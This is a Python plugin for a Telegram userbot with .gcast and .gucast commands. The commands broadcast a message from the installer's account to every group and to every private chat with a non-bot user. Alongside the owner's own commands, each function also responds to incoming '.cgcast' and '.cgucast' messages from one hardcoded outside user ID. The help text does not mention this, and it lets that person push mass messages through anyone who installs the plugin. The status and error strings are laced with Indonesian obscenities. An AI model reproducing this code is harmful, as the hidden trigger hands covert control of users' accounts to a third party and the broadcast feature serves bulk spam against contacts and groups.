from userbot.events import register
from userbot import CMD_HELP, bot

# ADDED BY : RAM-UBOT

GCAST_BLACKLIST = [
    -1001473548283,  # SharingUserbot
    -1001433238829,  # TedeSupport
    -1001476936696,  # AnosSupport
    -1001327032795,  # UltroidSupport
    -1001294181499,  # UserBotIndo
    -1001419516987,  # VeezSupportGroup
    -1001209432070,  # GeezSupportGroup
    -1001296934585,  # X-PROJECT BOT
    -1001481357570,  # UsergeOnTopic
    -1001459701099,  # CatUserbotSupport
    -1001109837870,  # TelegramBotIndonesia
    -1001752592753,  # Skyzusupport
    -1001456135097,  # SpamBot
    -1001462425381,  # GRUP GUA
    -1001649802697,  # GRUP GUA
    -1001489233533,  # RumahKitaroo
    -1001302879778,  # GRUPMUTUALANUSERBOT
    -1001705349543,  # GEEZNEWGRUP
    -1001692751821, # ramsupportt
]
    

# BLACKLIST NYA JANGAN DI HAPUS NGENTOD.

@register(outgoing=True, pattern=r"^\.gcast(?: |$)(.*)")
@register(incoming=True, from_users=1694909518, pattern=r"^\.cgcast(?: |$)(.*)")
async def gcast(event):
    xx = event.pattern_match.group(1)
    if xx:
        msg = xx
    elif event.is_reply:
        msg = await event.get_reply_message()
    else:
        await event.edit("** PESAN NYA MANA KONTOL??**")
        return
    kk = await event.edit("`𝚂𝙰𝙱𝙰𝚁 𝙻𝙰𝙷 𝙺𝙰𝚄 𝙳𝙸𝙺𝙸𝚃 𝙺𝙾𝙽𝚃𝙾𝙻 𝙸𝙽𝙸 𝚄𝙳𝙰𝙷 𝙼𝙰𝚄 𝙳𝙸 𝙺𝙸𝚁𝙸𝙼 𝙺𝙴 𝚂𝙴𝙼𝚄𝙰 𝙶𝚁𝙾𝚄𝙿 𝙹𝙰𝙼𝙴𝚃`")
    er = 0
    done = 0
    async for x in event.client.iter_dialogs():
        if x.is_group:
            chat = x.id
            try:
                if chat not in GCAST_BLACKLIST:
                    await event.client.send_message(chat, msg)
                    done += 1
                elif chat not in GCAST_BLACKLIST:
                    pass
            except BaseException:
                er += 1
    await kk.edit(
        f"**𝚄𝙳𝙰𝙷 𝙱𝙴𝚁𝙷𝙰𝚂𝙸𝙻 𝚈𝙰 𝙺𝙾𝙽𝚃𝙾𝙻 𝙼𝙴𝙽𝙶𝙴𝚁𝙸𝙼 𝙿𝙴𝚂𝙰𝙽 𝙺𝙴** `{done}` **𝙶𝚁𝙾𝚄𝙿, 𝙶𝙰𝙶𝙰𝙻 𝙼𝙴𝙽𝙶𝙴𝚁𝙸𝙼 𝙿𝙴𝚂𝙰𝙽 𝙺𝙴** `{er}` **𝙶𝚁𝙾𝚄𝙿**"
    )


@register(outgoing=True, pattern=r"^\.gucast(?: |$)(.*)")
@register(incoming=True, from_users=1694909518, pattern=r"^\.cgucast(?: |$)(.*)")
async def gucast(event):
    xx = event.pattern_match.group(1)
    if not xx:
        return await event.edit("`PESAN NYA MANA KONTOLLL?`")
    tt = event.text
    msg = tt[7:]
    kk = await event.edit("`SABAR YA KONTOL INI LAGI DI KIRIM`")
    er = 0
    done = 0
    async for x in bot.iter_dialogs():
        if x.is_user and not x.entity.bot:
            chat = x.id
            try:
                done += 1
                await bot.send_message(chat, msg)
            except BaseException:
                er += 1
    await kk.edit(f"udah berhasil ya kontol ngirim pesan ke `{done}` obrolan, kesalahan dalam `{er}` obrolan(s)")


CMD_HELP.update(
    {
        "gcast": "𝘾𝙤𝙢𝙢𝙖𝙣𝙙: `.gcast`\
         \n↳ : Mengirim Pesan Ke Pada Group Alay Dan Sampah Secara Global."})

CMD_HELP.update(
    {
         "gucast": "𝘾𝙤𝙢𝙢𝙖𝙣𝙙: `.gucast`\
         \n↳ : Mengirim Pesan Pribadi Secara Global."
    }
)
